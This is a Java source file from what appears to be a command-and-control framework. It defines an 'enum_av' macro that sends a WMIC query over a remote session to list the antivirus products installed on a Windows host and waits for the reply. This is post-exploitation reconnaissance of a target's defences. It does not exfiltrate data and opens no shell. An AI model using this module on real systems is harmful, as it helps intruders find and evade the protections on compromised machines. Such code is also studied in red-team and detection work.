package c2.session.macro.enumeration;

import c2.session.macro.AbstractCommandMacro;
import c2.session.macro.MacroOutcome;

public class WindowsAVEnumerator extends AbstractCommandMacro {

	public static final String COMMAND = "enum_av";
	public static final String WMIC_COMMAND = "wmic /namespace:\\\\root\\SecurityCenter2 path AntiVirusProduct get * /value";
	
	@Override
	public boolean isCommandMatch(String cmd) {
		return cmd.equalsIgnoreCase(COMMAND);
	}

	@Override
	public MacroOutcome processCmd(String cmd, int sessionId, String sessionStr) {
		MacroOutcome outcome = new MacroOutcome();
		sendCommand(WMIC_COMMAND, sessionId, outcome);
		awaitResponse(sessionId, outcome);
		return outcome;
	}

}
